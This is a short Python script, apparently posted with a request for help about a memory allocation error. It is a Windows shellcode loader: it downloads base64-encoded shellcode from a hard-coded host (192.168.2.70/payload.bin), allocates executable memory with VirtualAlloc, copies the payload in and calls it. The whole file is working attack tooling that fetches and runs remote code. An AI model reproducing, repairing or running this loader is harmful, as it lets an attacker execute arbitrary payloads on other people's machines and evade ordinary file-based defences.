# Issues: Getting a memory allocation error
# Tried a few solutions online to no avail

from urllib import request

import base64
import ctypes

k32 = ctypes.windll.kernel32

def get_code(url):
    with request.urlopen(url) as response:
        shellcode = base64.b64decode(response.read())
    return shellcode

def write_memory(buf):
    length = len(buf)

    k32.VirtualAlloc.restype = ctypes.c_void_p

    ptr = k32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(length), ctypes.c_int(0x3000), ctypes.c_int(0x40))

    k32.RtlMoveMemory(ctypes.c_void_p(ptr), buf, ctypes.c_int(length))
    return ptr

def run(shellcode):
    buffer = ctypes.create_string_buffer(shellcode)

    ptr = write_memory(buffer)

    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    shell_func()

if __name__ == '__main__':
    url = 'http://192.168.2.70/payload.bin'
    shellcode = get_code(url)
    run(shellcode)
